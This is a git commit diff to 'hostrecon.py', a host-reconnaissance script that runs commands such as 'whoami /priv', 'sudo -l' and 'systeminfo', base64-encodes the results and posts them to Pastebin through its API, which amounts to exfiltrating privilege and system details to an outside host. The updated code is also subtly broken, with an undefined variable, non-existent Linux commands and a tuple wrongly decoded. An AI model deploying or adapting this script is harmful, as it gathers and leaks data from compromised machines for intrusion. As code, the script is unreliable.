3fbbf477aba37156d2da6a38c9a5a6bde2a65b03
Guardx57 <91447360+Guardx57@users.noreply.github.com>
2021-12-15 23:44:17 +0700

    Update hostrecon.py

--- hostrecon.py
+++ hostrecon.py
@@ -9,41 +9,24 @@ def pastebin_func(data):
     link = 'https://pastebin.com/api/api_post.php'
 
     api ={'api_dev_key' : "" #masukkan api pastebinnya
-        , 'api_paste_code' :  data,'api_paste_name' : 'Target', 'api_option' : 'paste'}
+        , 'api_paste_code' :  data_b64, 'api_option' : 'paste'}
     try:
         send = requests.post(link, data=api)
     except:
         print("Error")
 
-
-def linx_os():
-    run = ["uname -a", "sudo -l", "hostname"]
+def os_check():
+    privwin = ["hostname","whoami","whoami /priv"]
+    privlin = ["hostname", "user", "priviledges"]
     data=[]
-    for i in run:
-        subp = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-        str,strerr=subp.communicate()
-        if strerr != b'':
-            data.append(i)
-            data.append(strerr.decode())
-        else:
-            data.append(str.decode())
-    data ="\n".join(data)
-    data_b64 = base64.b64encode(data.encode('utf-8')).decode('utf-8')
-    pastebin_func(data_b64)
-
-
-
-def win_os():
-    run = ["systeminfo","whoami","whoami /priv"]
-    data=[]
-    for i in run:
-        subp = subprocess.Popen(args=i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-        str,strerr=subp.communicate()
-        if strerr != b'':
-            data.append(i)
-            data.append(strerr.decode())
-        else:
-            data.append(str.decode())
+    if os.name == "nt":
+        priv = privwin
+    else:
+        priv = privlin
+    for i in priv:
+        subp = subprocess.Popen(args=i, stdout=subprocess.PIPE)
+        strg=subp.communicate()
+        data.append(strg.decode())
     data ="\n".join(data)
     data_b64 = base64.b64encode(data.encode('utf-8')).decode('utf-8')
     pastebin_func(data_b64)
@@ -52,10 +35,7 @@ def win_os():
 
 
 def main():
-    if os.name == "nt":
-        win_os()
-    else: 
-        linx_os()
+    os_check()
 
 if __name__ == '__main__':
     main()
